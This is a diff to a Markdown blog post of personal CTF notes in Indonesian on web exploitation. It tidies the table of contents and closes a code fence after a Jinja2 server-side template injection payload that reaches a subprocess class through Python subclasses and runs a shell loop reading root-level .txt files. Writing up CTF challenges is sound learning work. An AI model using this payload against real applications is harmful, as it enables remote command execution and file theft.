@@ -5,8 +5,8 @@ pubDate: 2025-07-25 10:00
 slug: "ctf-notes"
 ---
 
--[Web](#web)
-    - [SSTI](#ssti)
+- [Web](#web)
+    1. [SSTI](#ssti)
 
 Ini adalah catetan saya yang dibuat secara personal berdasarkan pengalaman saya yang telah mengerjakan ctf selama ini
 
@@ -159,4 +159,5 @@ tapi untuk chall ini, letak flag di letakkan di luar main dir `/app`, sedangkan 
 
 ```
 {{ dict.__base__.__subclasses__()[371]("for f in /?*.txt; do cat $f; done", shell=True, stdout=-1).communicate() }}
+```
 
